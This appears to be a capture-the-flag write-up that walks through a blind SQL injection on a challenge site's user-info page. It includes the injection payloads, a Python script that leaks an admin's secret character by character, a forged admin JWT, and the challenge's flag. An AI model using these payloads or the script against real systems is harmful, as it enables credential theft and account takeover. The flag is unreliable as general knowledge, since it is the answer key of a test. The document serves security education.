# Task 7

Prompt:
![](../img/prompts/task_7.png)

Our goal here is to get an admin JWT. Here's our current JWT again:

```
{
  "typ": "JWT",
  "alg": "HS256"
}
{
  "iat": 1662503990,
  "exp": 1665095990,
  "uid": 36828,
  "sec": "m5ehCyJiYpRRSI2DMQWhNM1jIIE1HiuW"
}
```

All of the fields are standard except for the `uid` and `sec` fields. We can find out what those fields mean from the `util.py` file from the server's files:
```py
def validate_token(token):
	try:	
		claims = jwt.decode(token, hmac_key(), algorithms=['HS256'])
	except:
		# Either invalid format, expired, or wrong key
		return False
	with userdb() as con:
		row = con.execute('SELECT secret FROM Accounts WHERE uid = ?', (claims['uid'],)).fetchone()
		if row is None:
			return False
		return row[0] == claims['sec']
```

So the `uid` is the unique identifier given to an account and the `sec` field is some secret value given to an account. Good to know.

Just out of curiosity, what happens when we try to view the admin page?

![](../img/7/admin_page_denied.png)

Great... Well, it was worth a shot.

If we go to the `Admin List` page, we can see the admins for the website. It seems as if `NiceOttoman` is the only online admin:

![](../img/7/admin_list.png)

That's our target. Let's try to figure out `NiceOttoman`'s `uid` and `secret`.

---

Since we unfortunately don't have direct access to these databases, we have to find another way. Looking at the source code, it seems like our input gets used in a few SQL queries into the databases. Maybe we can try some form for SQL injection to leak the admin's secret. First, we need to figure out the admin's `uid` value before starting to go after the secret.

Most of the SQL queries that take in our input are using prepared queries, so that negates our chances of injection. Fortunately, it seems as if there's one query that does NOT use prepared statements, making it vulnerable. Let's target that one.

Here's the vulnerable code (injection can happen in `infoquery`):
```py
def userinfo():
	""" Create a page that displays information about a user """			
	query = request.values.get('user')
	if query == None:
		query =  util.get_username()	
	userName = memberSince = clientsHelped = hackersHelped = contributed = ''
	with util.userdb() as con:	
		infoquery= "SELECT u.memberSince, u.clientsHelped, u.hackersHelped, u.programsContributed FROM Accounts a INNER JOIN UserInfo u ON a.uid = u.uid WHERE a.userName='%s'" %query
		row = con.execute(infoquery).fetchone()	
		if row != None:
			userName = query
			memberSince = int(row[0])
			clientsHelped = int(row[1])
			hackersHelped = int(row[2])
			contributed = int(row[3])
	if memberSince != '':
		memberSince = datetime.utcfromtimestamp(int(memberSince)).strftime('%Y-%m-%d')
	resp = make_response(render_template('userinfo.html', 
		userName=userName,
		memberSince=memberSince, 
		clientsHelped=clientsHelped,
		hackersHelped=hackersHelped, 
		contributed=contributed,
		pathkey=expected_pathkey()))
	return resp
```

It seems as if it happens on the `userinfo` page. If we access it normally, we see this:

![](../img/7/main_user_info.png)

It seems as if the code allows us to send a custom user through a GET request parameter under the `user` variable. If we send in garbage(`?user=asdfasdf`), we get this:

![](../img/7/userinfo_garbage.png)

The values went away. This would happen because the SQL query couldn't find the user `asdfasdf`. Maybe we can use this output mechanism to our advantage.

Since the code is using sqlite3, we can add a comment at the end of the statement by adding a "--" to the end. Looking at the SQL statement itself, we can send statements like

`NiceOttoman' AND u.uid==<uid>--`

and brute force the `uid` value this way. If we get values in the 4 boxes back, then we know we've got the correct value!

Using a binary search, we can optimize the time taken with this approach and figure out that `NiceOttoman`'s uid is `45863`:

![](../img/7/userinfo_uid.png)

With that, now we need to figure out the secret. We can use a similar injection to start leaking the secret key. The issue is that it's long, so we have to be smart in figuring this out. I decided to brute force the secret one letter at a time. We can access the username's secret by using `a.secret`. We can iterate over each letter by using `SUBSTR(a.secret, 2, 1)`. This gets the second character of `a.secret`. We can go over all the alphanumeric values and test them against the actual secret to see if they are right. To slightly improve the speed, I checked LOWER(SUBSTR(a.secret, \<idx>, 1)) against only the lowercase values, and then did an additional check for the case of the letter. With that, we can go ahead and start testing with the injection:

`NiceOttoman' AND LOWER(SUBSTR(a.secret, \<idx>, 1))=='\<letter>'--`

Because the secret is long, I decided to automate this:

```py
import requests

UID = 45863

example_secret = "m5ehCyJiYpRRSI2DMQWhNM1jIIE1HiuW"

alphabet = 'abcdefghijklmnopqrstuvwxyz'
numbers = '0123456789'
all_chars = alphabet + numbers

full_secret = ""
url = "https://clloahayjtqaztvg.ransommethis.net/mhqtyrypxgtseywu/userinfo?user="
s = requests.Session()

for i in range(1, len(example_secret)+1):
    for char in all_chars:
        injection = f"NiceOttoman%27%20AND%20LOWER(SUBSTR(a.secret,%20{i},%201))==%27{char}%27--"
        next_url = url + injection
        res = s.get(next_url, cookies={'tok': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjI1MDM5OTAsImV4cCI6MTY2NTA5NTk5MCwidWlkIjozNjgyOCwic2VjIjoibTVlaEN5SmlZcFJSU0kyRE1RV2hOTTFqSUlFMUhpdVcifQ.sYtPx-nuiRySL9hJi85P0MuP1_q3YMSbUXmcICxzn1M'})

        if res.text.split("Users Helped:")[1].split("</p>")[0].split("<p>")[1].strip() != "":
            if char in alphabet:
                injection = f"NiceOttoman%27%20AND%20SUBSTR(a.secret,%20{i},%201)==%27{char}%27--"
                next_url = url + injection
                res = s.get(next_url, cookies={'tok': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjI1MDM5OTAsImV4cCI6MTY2NTA5NTk5MCwidWlkIjozNjgyOCwic2VjIjoibTVlaEN5SmlZcFJSU0kyRE1RV2hOTTFqSUlFMUhpdVcifQ.sYtPx-nuiRySL9hJi85P0MuP1_q3YMSbUXmcICxzn1M'})
                if res.text.split("Users Helped:")[1].split("</p>")[0].split("<p>")[1].strip() != "":
                    full_secret += char
                else:
                    full_secret += char.upper()
            else:
                full_secret += char

            print(f"Found next char: {full_secret[-1]}")
            break
print(f"Final secret: {full_secret}")
```

Running this against the website, we get our secret:

![](../img/7/brute.png)

We can now forge our JWT cookie in the same manner as in task 6 but using the admin's `uid` and `secret` to get us this value: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NTM1NzgxMjcsImV4cCI6MjY2NjE3MDEyNywic2VjIjoiY1pkT1djY2h3YUN4UjlVd1dxMjdiQUxNUElNazZUc3kiLCJ1aWQiOjQ1ODYzfQ.vLCLBnaymKj-HldlU21Q9lgpPeyyJ5IuuHjUIWO_8Qg`

```
{
  "typ": "JWT",
  "alg": "HS256"
}
{
  "iat": 1653578127,
  "exp": 2666170127,
  "sec": "cZdOWcchwaCxR9UwWq27bALMPIMk6Tsy",
  "uid": 45863
}
```

We can now click on the admin page and view its contents!

![](../img/7/admin_page.png)

We can submit the JWT cookie and continue to the next task!

Flag: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NTM1NzgxMjcsImV4cCI6MjY2NjE3MDEyNywic2VjIjoiY1pkT1djY2h3YUN4UjlVd1dxMjdiQUxNUElNazZUc3kiLCJ1aWQiOjQ1ODYzfQ.vLCLBnaymKj-HldlU21Q9lgpPeyyJ5IuuHjUIWO_8Qg`
![](../img/submissions/task_7_solve.png)